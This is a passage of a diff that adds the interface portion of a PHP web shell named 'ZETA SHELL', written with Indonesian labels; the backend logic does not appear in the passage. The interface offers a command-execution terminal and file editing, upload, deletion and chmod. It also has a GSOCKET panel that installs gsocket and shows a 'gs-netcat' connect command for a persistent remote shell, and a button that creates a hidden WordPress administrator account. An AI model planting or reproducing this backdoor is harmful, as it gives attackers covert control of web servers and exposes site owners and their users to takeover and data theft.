+    .perm-box { display:inline-block; padding:1px 4px; border:1px solid #2c4870; font-size:15px; }
+    .perm-green { color:#6ab04c; }
+    .perm-red { color:#eb4d4b; }
+    .perm-orange { color:#e3c872; }
+    .user-info { color:#e3c872; float:right; font-size:14px; }
+    
+    /* Inner Table */
+    table.inner { border:none; width:100%; }
+    table.inner td { border:none; padding:2px; }
+    
+    /* CHMOD Form */
+    .chmod-form { display:inline; }
+    .chmod-form input[type="text"] { width:35px; font-size:15px; padding:1px; border:1px solid #2c4870; background:#1a2b4c; color:#c8d6e5; }
+    .chmod-form input[type="submit"] { font-size:9px; padding:1px 4px; border:1px solid #2c4870; background:#2c4870; color:#c8d6e5; cursor:pointer; }
+    .chmod-form input[type="submit"]:hover { background:#3a5a82; color:#f0db8f; }
+    
+    /* GSOCKET, WP, Tools Box */
+    .gs-box, .wp-box, .tool-box { background:#15243f; color:#e3c872; padding:10px; margin:8px 0; border:2px solid #2c4870; overflow-x:auto; }
+    .gs-box .row, .wp-box .row, .tool-box .row { display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin:3px 0; }
+    .gs-box .label, .wp-box .label, .tool-box .label { color:#2c4870; min-width:70px; }
+    .gs-box .val, .wp-box .val, .tool-box .val { color:#c8d6e5; }
+    .gs-box .btn, .wp-box .btn, .tool-box .btn { background:#1a2b4c; color:#e3c872; border:1px solid #2c4870; padding:3px 12px; cursor:pointer; text-decoration:none; font-size:12px; display:inline-block; }
+    .gs-box .btn:hover, .wp-box .btn:hover, .tool-box .btn:hover { background:#2c4870; color:#f0db8f; }
+    .gs-box .secret { background:#15243f; padding:8px; border:1px solid #2c4870; color:#6ab04c; font-size:16px; text-align:center; word-break:break-all; margin:5px 0; }
+    .gs-box .badge-on { color:#6ab04c; }
+    .gs-box .badge-off { color:#eb4d4b; }
+    .gs-msg, .wp-result, .tool-msg { background:#15243f; padding:10px; margin:5px 0; font-size:12px; color:#e3c872; white-space:pre-wrap; word-break:break-all; max-height:300px; overflow-y:auto; }
+    
+    .tool-box .form-row { margin:5px 0; display:flex; flex-wrap:wrap; gap:6px; align-items:center; }
+    .tool-box .form-row input { background:#1a2b4c; color:#c8d6e5; border:1px solid #2c4870; padding:4px 8px; font-family:'Courier New',monospace; font-size:12px; flex:1; min-width:80px; }
+    .tool-box .form-row input[type="submit"] { background:#2c4870; color:#e3c872; border:1px solid #2c4870; cursor:pointer; flex:0; }
+    .tool-box .form-row input[type="submit"]:hover { background:#3a5a82; color:#f0db8f; }
+    .tool-box .form-row input::placeholder { color:#2c4870; }
+    .tool-box small { color:#2c4870; font-size:10px; }
+    
+    /* Popup (Rename, Touch, dll) */
+    .popup-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(20, 36, 63, 0.9); z-index:999; align-items:center; justify-content:center; }
+    .popup-overlay.active { display:flex; }
+    .popup-box { background:#1e375a; border:3px solid #e3c872; padding:25px; max-width:400px; width:90%; }
+    .popup-box h2 { text-align:center; font-size:18px; margin-bottom:15px; text-transform:uppercase; letter-spacing:1px; color:#e3c872; }
+    .popup-box hr { border:2px solid #2c4870; margin-bottom:15px; }
+    .popup-box label { display:block; font-weight:bold; margin-top:10px; color:#e3c872; }
+    .popup-box input[type="text"] { width:100%; padding:8px; border:2px solid #2c4870; background:#1a2b4c; color:#f0db8f; font-family:'Courier New',monospace; font-size:14px; margin-top:3px; }
+    .popup-box .btn-row { display:flex; gap:10px; margin-top:15px; justify-content:center; }
+    .popup-box .btn-row input, .popup-box .btn-row a { padding:8px 25px; border:2px solid #2c4870; background:#233d62; color:#e3c872; font-family:'Courier New',monospace; font-weight:bold; font-size:14px; cursor:pointer; text-decoration:none; }
+    .popup-box .btn-row input:hover, .popup-box .btn-row a:hover { background:#3a5a82; color:#f0db8f; }
+    
+    /* Responsive Mobile */
+    @media (max-width:768px) {
+        body { padding:5px; }
+        .header { font-size:14px; padding:8px; }
+        .header .user-info { float:none; display:block; text-align:right; font-size:12px; }
+        .menu-tools { gap:3px 8px; }
+        .menu-tools a { font-size:11px; }
+        table.inner td { display:block; width:100% !important; padding:4px; }
+        .actions select { width:60px; font-size:9px; }
+        .actions input[type="text"] { width:25px; font-size:8px; }
+        .terminal { font-size:10px; max-height:300px; }
+        .terminal-input { font-size:10px; }
+        .sysinfo td { display:block; padding:2px; }
+        .sysinfo .label { width:auto; }
+        .gs-box .row, .wp-box .row, .tool-box .row { gap:4px; }
+        .gs-box .btn, .wp-box .btn, .tool-box .btn { font-size:10px; padding:2px 8px; }
+        .popup-box { padding:15px; }
+        .popup-box h2 { font-size:16px; }
+        .tool-box .form-row { flex-direction:column; align-items:stretch; }
+        .breadcrumb { font-size:10px; white-space:normal; }
+    }
+    @media (max-width:480px) {
+        .header { font-size:12px; }
+        .menu-tools a { font-size:10px; }
+        .actions select { width:50px; font-size:8px; }
+        .actions input[type="submit"] { font-size:8px; padding:1px 4px; }
+        input { font-size:11px; }
+    }
+</style>
+</head>
+<body>
+
+<div class="popup-overlay <?= $show_rename_popup ? 'active' : '' ?>">
+    <div class="popup-box">
+        <h2>RENAME</h2>
+        <hr>
+        <form method="POST">
+            <label>FILE LAMA</label>
+            <input type="text" value="<?= $rename_file ?>" disabled style="background:#0f0c0a;color:#4a3a33;">
+            <input type="hidden" name="rename_old" value="<?= $rename_file ?>">
+            <label>NAMA BARU</label>
+            <input type="text" name="rename_new" value="<?= $rename_file ?>" required autofocus>
+            <div class="btn-row">
+                <input type="submit" value="RENAME">
+                <a href="?dir=<?= urlencode($current_dir) ?>&zetaxploiter">BATAL</a>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div class="popup-overlay <?= $show_touch_popup ? 'active' : '' ?>">
+    <div class="popup-box">
+        <h2>TOUCH</h2>
+        <hr>
+        <form method="POST">
+            <label>FILE</label>
+            <input type="text" value="<?= $touch_file ?>" disabled style="background:#0f0c0a;color:#4a3a33;">
+            <input type="hidden" name="touch_file" value="<?= $touch_file ?>">
+            <p style="margin-top:10px;color:#4a3a33;font-size:13px;">Timestamp akan diupdate ke waktu sekarang.<br>Jika file tidak ada, akan dibuat baru.</p>
+            <div class="btn-row">
+                <input type="submit" value="TOUCH">
+                <a href="?dir=<?= urlencode($current_dir) ?>&zetaxploiter">BATAL</a>
+            </div>
+        </form>
+    </div>
+</div>
+
+<table>
+<tr><td colspan="2" class="header">
+    ZETA SHELL
+ | <a href="?logout&zetaxploiter" class="user-info">LOGOUT</a></span>
+</td></tr>
+<tr><td colspan="2" style="padding:8px;">
+
+<?php if (isset($_GET['logout'])): ?>
+    <?php session_destroy(); header('Location: ' . $_SERVER['PHP_SELF'] . '?zetaxploiter'); exit; ?>
+<?php endif; ?>
+
+
+<div class="breadcrumb">
+    <?php
+    $path_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
+    $build_path = '';
+    echo '<a href="?dir=' . urlencode('/') . '&zetaxploiter" style="color:#b08050;">/</a>';
+    foreach ($path_parts as $part) {
+        if (empty($part)) continue;
+        $build_path .= DIRECTORY_SEPARATOR . $part;
+        echo ' <span class="sep">/</span> ';
+        echo '<a href="?dir=' . urlencode($build_path) . '&zetaxploiter">' . htmlspecialchars($part) . '</a>';
+    }
+    $server_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
+    $home_dir = getenv('HOME') ?: '/home/' . get_current_user();
+    $tmp_dir = sys_get_temp_dir();
+    $shortcuts = [];
+    if (!empty($server_root) && $server_root !== $current_dir) $shortcuts[] = ['name' => 'SERVER', 'path' => $server_root];
+    if (is_dir($home_dir) && $home_dir !== $current_dir && $home_dir !== $server_root) $shortcuts[] = ['name' => 'HOME', 'path' => $home_dir];
+    if (is_dir($tmp_dir) && $tmp_dir !== $current_dir && $tmp_dir !== $server_root) $shortcuts[] = ['name' => 'TMP', 'path' => $tmp_dir];
+    if (!empty($shortcuts)) {
+        echo ' <span style="color:#4a3a33;">|</span> ';
+        foreach ($shortcuts as $s) {
+            echo ' <a href="?dir=' . urlencode($s['path']) . '&zetaxploiter" class="shortcut">[' . $s['name'] . ']</a>';
+        }
+    }
+    ?>
+</div>
+
+<?php if (!empty($success)): ?>
+    <div class="alert alert-success">[OK] <?= htmlspecialchars($success) ?></div>
+<?php endif; ?>
+<?php if (!empty($error)): ?>
+    <div class="alert alert-error">[ERR] <?= htmlspecialchars($error) ?></div>
+<?php endif; ?>
+
+<?php if (isset($is_editing) && $is_editing === true): ?>
+    <div class="editor">
+        <h2 style="color:#8a7a6a;">EDIT: <?= htmlspecialchars($_GET['edit'] ?? '') ?></h2>
+        <form method="POST">
+            <textarea name="content"><?= htmlspecialchars($content ?? '') ?></textarea>
+            <br><br>
+            <input type="submit" value="[ SIMPAN ]">
+            <a href="?dir=<?= urlencode($current_dir) ?>&zetaxploiter" class="btn" style="text-decoration:none;padding:4px 15px;border:2px solid #2a1f1a;background:#2a1f1a;">[ BATAL ]</a>
+        </form>
+    </div>
+<?php else: ?>
+
+<table class="inner">
+<tr>
+<td style="width:100%;">
+
+<div class="menu">
+    <div class="menu-tools">
+        <a href="?dir=<?= urlencode($current_dir) ?>&zetaxploiter">[REFRESH]</a>
+        <a href="?dir=<?= urlencode(dirname($current_dir)) ?>&zetaxploiter">[PARENT]</a>
+        <a href="?toggle_terminal=1&dir=<?= urlencode($current_dir) ?>&zetaxploiter"><?= $show_terminal ? '[HIDE TERMINAL]' : '[TERMINAL]' ?></a>
+        <a onclick="document.getElementById('sys').style.display=document.getElementById('sys').style.display=='none'?'block':'none';">[SYSINFO]</a>
+        <a onclick="document.getElementById('gs').style.display=document.getElementById('gs').style.display=='none'?'block':'none';">[GSOCKET]</a>
+        <a onclick="document.getElementById('wp').style.display=document.getElementById('wp').style.display=='none'?'block':'none';">[WP USER]</a>
+        <a href="?show_upload=<?= $show_upload == '1' ? '0' : '1' ?>&dir=<?= urlencode($current_dir) ?>&zetaxploiter">[<?= $show_upload == '1' ? 'HIDE' : 'UPLOAD' ?>]</a>
+        <a href="?show_unzip=<?= $show_unzip == '1' ? '0' : '1' ?>&dir=<?= urlencode($current_dir) ?>&zetaxploiter">[<?= $show_unzip == '1' ? 'HIDE' : 'UNZIP' ?>]</a>
+        <a href="?show_createdir=<?= $show_createdir == '1' ? '0' : '1' ?>&dir=<?= urlencode($current_dir) ?>&zetaxploiter">[<?= $show_createdir == '1' ? 'HIDE' : 'DIR' ?>]</a>
+        <a href="?show_createfile=<?= $show_createfile == '1' ? '0' : '1' ?>&dir=<?= urlencode($current_dir) ?>&zetaxploiter">[<?= $show_createfile == '1' ? 'HIDE' : 'FILE' ?>]</a>
+    </div>
+</div>
+
+<div id="sys" style="display:none;"><div class="sysinfo"><table>
+<tr><td class="label">OS</td><td><?= htmlspecialchars($sysinfo['os'] ?? '') ?></td></tr>
+<tr><td class="label">HOST</td><td><?= htmlspecialchars($sysinfo['hostname'] ?? '') ?></td></tr>
+<tr><td class="label">PHP</td><td><?= htmlspecialchars($sysinfo['php'] ?? '') ?></td></tr>
+<tr><td class="label">SERVER</td><td><?= htmlspecialchars($sysinfo['server'] ?? '') ?></td></tr>
+<tr><td class="label">DISABLED</td><td><?= htmlspecialchars($sysinfo['disabled'] ?? '') ?></td></tr>
+</table></div></div>
+
+<div id="gs" style="display:none;">
+<div class="gs-box">
+    <div class="row"><span style="color:#b8a090;font-weight:bold;">GSOCKET</span></div>
+    <div class="row">
+        <span class="label">user</span><span class="val"><?= get_current_user() ?></span>
+        <span class="label">status</span>
+        <?php if ($gs_running): ?><span class="badge-on">running</span>
+        <?php elseif ($gs_installed): ?><span class="badge-off">stopped</span>
+        <?php else: ?><span class="badge-off">not installed</span><?php endif; ?>
+        <span class="label">installed</span>
+        <?php if ($gs_installed): ?><span class="badge-on">yes</span><?php else: ?><span class="badge-off">no</span><?php endif; ?>
+    </div>
+    <div class="row"><span class="label">secret</span></div>
+    <div class="secret"><?= $gs_secret ? htmlspecialchars($gs_secret) : '[not found]' ?></div>
+    <div class="row">
+        <a href="?gs_action=install&zetaxploiter" class="btn">INSTALL</a>
+        <?php if ($gs_installed): ?>
+            <a href="?gs_action=start&zetaxploiter" class="btn">START</a>
+            <a href="?gs_action=stop&zetaxploiter" class="btn">STOP</a>
+        <?php endif; ?>
+        <a href="?gs_action=find&zetaxploiter" class="btn">FIND SECRET</a>
+        <a href="?gs_action=status&zetaxploiter" class="btn" target="_blank">STATUS</a>
+        <a href="?zetaxploiter" class="btn">REFRESH</a>
+    </div>
+    <?php if ($gs_secret && $gs_installed): ?>
+    <div class="row"><span class="label">connect</span></div>
+    <div style="background:#0f0c0a;padding:6px 10px;border:1px solid #2a1f1a;color:#6a5a4a;font-size:12px;word-break:break-all;margin:3px 0;">
+        gs-netcat -s "<?= htmlspecialchars($gs_secret) ?>" -i
+    </div>
+    <?php endif; ?>
+    <?php if ($gs_msg): ?><div class="gs-msg"><?= htmlspecialchars($gs_msg) ?></div><?php endif; ?>
+</div>
+</div>
+
+<div id="wp" style="display:none;">
+<div class="wp-box">
+    <div class="row"><span style="color:#b8a090;font-weight:bold;">WP USER</span></div>
+    <div class="row">
+        <a href="?wp_action=create&zetaxploiter" class="btn">CREATE WP ADMIN</a>
+    </div>
+    <?php if ($wp_result && !isset($wp_result['error'])): ?>
+    <div class="wp-result">
+        <?php foreach ($wp_result as $k => $v): ?>
+            <?php if ($k == 'status') continue; ?>
+            <div><span style="color:#4a3a33;"><?= $k ?>:</span> <?= htmlspecialchars($v) ?></div>
+        <?php endforeach; ?>
+        <div style="color:#6a8a5a;"><?= $wp_result['status'] ?></div>
+    </div>
+    <?php elseif (isset($wp_result['error'])): ?>
+    <div class="wp-result" style="color:#b06040;">ERROR: <?= htmlspecialchars($wp_result['error']) ?></div>
+    <?php endif; ?>
+</div>
+</div>
+
+<?php if ($show_upload == '1'): ?>
+<div class="tool-box">
+    <div class="row"><span style="color:#b8a090;font-weight:bold;">UPLOAD</span></div>
+    <form method="POST" enctype="multipart/form-data">
+        <div class="form-row"><input type="file" name="file" required><input type="submit" value="UPLOAD"></div>
+    </form>
+    <small>max: <?= MAX_FILE_SIZE/1024/1024 ?>MB</small>
+</div>
+<?php endif; ?>
+
+<?php if ($show_unzip == '1'): ?>
+<div class="tool-box">
+    <div class="row"><span style="color:#b8a090;font-weight:bold;">UNZIP</span></div>
+    <form method="POST">
+        <div class="form-row"><input type="text" name="unzip_file" placeholder="nama.zip" required><input type="submit" value="UNZIP"></div>
+    </form>
+    <small>ekstrak ke direktori ini</small>
+</div>
+<?php endif; ?>
+
+<?php if ($show_createdir == '1'): ?>
+<div class="tool-box">
+    <div class="row"><span style="color:#b8a090;font-weight:bold;">BUAT DIR</span></div>
+    <form method="POST">
+        <div class="form-row"><input type="text" name="dirname" placeholder="nama" required><input type="submit" name="create_dir" value="BUAT"></div>
+    </form>
+</div>
+<?php endif; ?>
+
+<?php if ($show_createfile == '1'): ?>
+<div class="tool-box">
+    <div class="row"><span style="color:#b8a090;font-weight:bold;">BUAT FILE</span></div>
+    <form method="POST">
+        <div class="form-row"><input type="text" name="filename" placeholder="nama" required><input type="submit" name="create_file" value="BUAT"></div>
+    </form>
+</div>
+<?php endif; ?>
+
+<?php if ($show_terminal): ?>
+<div class="terminal">
+    <?php if (!empty($history)): ?>
+        <?php foreach ($history as $h): ?>
+            <div class="terminal-line">
+                <span class="terminal-prompt">[<?= htmlspecialchars($h['dir'] ?? '') ?>] $</span>
+                <span class="terminal-cmd"><?= htmlspecialchars($h['cmd'] ?? '') ?></span>
+            </div>
+            <?php if (!empty($h['output'])): ?>
+                <div class="terminal-output"><?= htmlspecialchars($h['output']) ?></div>
+            <?php endif; ?>
+        <?php endforeach; ?>
+    <?php endif; ?>
+<form method="POST">
+    <input type="hidden" name="dir" value="<?= htmlspecialchars($current_dir) ?>">
+    <div class="terminal-line">
+        <span class="terminal-prompt">[<?= htmlspecialchars($terminal_dir) ?>] $</span>
+        <input type="text" name="terminal_cmd" class="terminal-input" autocomplete="off" autofocus placeholder="perintah...">
+        <input type="submit" value="EXEC" style="background:#1a1410;color:#6a8a5a;border:1px solid #2a1f1a;padding:2px 10px;cursor:pointer;font-weight:bold;font-size:11px;">
+    </div>
+</form>
+</div>
+<?php endif; ?>
+
+<!-- ======== FILE LIST ======== -->
+<table style="width:100%;border:2px solid #2a1f1a;margin-top:8px;">
+    <div class="status-bar">
+    PWD > <?= htmlspecialchars($current_dir) ?>\ | items: <?= count($all_items ?? []) ?>
+</div>
+<tr style="background:#0f0c0a;color:#6a5a4a;">
+    <th style="padding:4px;text-align:left;width:4%;">#</th>
+    <th style="padding:4px;text-align:left;width:34%;">NAMA</th>
+    <th style="padding:4px;text-align:center;width:10%;">TYPE</th>
+    <th style="padding:4px;text-align:right;width:12%;">SIZE</th>
+    <th style="padding:4px;text-align:center;width:12%;">PERM</th>
+    <th style="padding:4px;text-align:center;width:28%;">AKSI</th>
+</tr>
+<?php
+$items = scandir($current_dir);
+$dirs = []; $files = [];
+foreach ($items as $item) {
+    if ($item === '.' || $item === '..') continue;
+    $path = $current_dir . DIRECTORY_SEPARATOR . $item;
+    if (is_dir($path)) $dirs[] = $item;
+    else $files[] = $item;
+}
+sort($dirs); sort($files);
+$all_items = array_merge($dirs, $files);
+$counter = 1;
+?>
+<?php if (count($all_items) === 0): ?>
+<tr><td colspan="6" style="text-align:center;padding:20px;font-weight:bold;color:#4a3a33;">[ KOSONG ]</td></tr>
+<?php endif; ?>
+<?php foreach ($all_items as $item): 
+    $path = $current_dir . DIRECTORY_SEPARATOR . $item;
+    $is_dir = is_dir($path);
+    $size = $is_dir ? '-' : format_size(filesize($path));
+    $type = $is_dir ? 'DIR' : get_file_type($item);
+    $perm = get_permissions($path);
+    $color = get_file_color($path);
+    $row = ($counter % 2 == 0) ? 'file-row-alt' : 'file-row';
+    $pclass = (is_writable($path) && is_readable($path)) ? 'perm-green' : ((!is_writable($path) && is_readable($path)) ? 'perm-red' : 'perm-orange');
+?>
+<tr class="<?= $row ?>">
+    <td style="padding:4px;color: #f7efeb;"><?= $counter ?></td>
+    <td style="padding:4px;color:<?= $color ?>;">
+        <?php if ($is_dir): ?>
+            <span class="dir"><a href="?dir=<?= urlencode($path) ?>&zetaxploiter" style="color:<?= $color ?>;"><?= htmlspecialchars($item) ?></a></span>
+        <?php else: ?>
+            <?= htmlspecialchars($item) ?>
+        <?php endif; ?>
+    </td>
+    <td style="text-align:center;padding:4px;color: #ffefe8;"><?= $type ?></td>
+    <td style="text-align:right;padding:4px;color: #ecded7;"><?= $size ?></td>
+    <td style="text-align:center;padding:4px;">
+        <span class="perm-box <?= $pclass ?>"><?= $perm ?></span>
+    </td>
+    <td style="text-align:center;padding:4px;" class="actions">
+        <select onchange="if(this.value) window.location.href=this.value;">
+            <option value="">[AKSI]</option>
+            <?php if (!$is_dir): ?>
+            <option value="?dir=<?= urlencode($current_dir) ?>&edit=<?= urlencode($item) ?>&zetaxploiter">EDIT</option>
+            <option value="?dir=<?= urlencode($current_dir) ?>&download=<?= urlencode($item) ?>&zetaxploiter">DOWNLOAD</option>
+            <?php endif; ?>
+            <option value="?dir=<?= urlencode($current_dir) ?>&touch_popup=<?= urlencode($item) ?>&zetaxploiter">TOUCH</option>
+            <option value="?dir=<?= urlencode($current_dir) ?>&rename=<?= urlencode($item) ?>&zetaxploiter">RENAME</option>
+            <option value="?dir=<?= urlencode($current_dir) ?>&delete=<?= urlencode($item) ?>&zetaxploiter" onclick="return confirm('Hapus?')">DELETE</option>
+            <?php if ($is_dir): ?>
+            <option value="?dir=<?= urlencode($path) ?>&zetaxploiter">OPEN</option>
+            <?php endif; ?>
+        </select>
+        <form method="POST" class="chmod-form" style="display:inline;">
+            <input type="hidden" name="chmod_file" value="<?= htmlspecialchars($item) ?>">
+            <input type="text" name="chmod_perm" placeholder="755" style="width:35px;font-size:15spx;padding:1px;border:1px solid #2a1f1a;background:#1a1410;color:#b8a090;">
+            <input type="submit" value="CHMOD" style="font-size:15px;padding:1px 4px;border:1px solid #2a1f1a;background:#2a1f1a;color:#b8a090;cursor:pointer;">
+        </form>
+    </td>
+</tr>
+<?php $counter++; endforeach; ?>
+</table>
+
+</td>
+</tr>
+</table>
+
+<?php endif; ?>
+
+
+</td></tr>
+<tr><td colspan="2" class="footer">ZETA SHELL &copy; LEOXSEC</td></tr>
+</table>
+
+</body>
+</html>
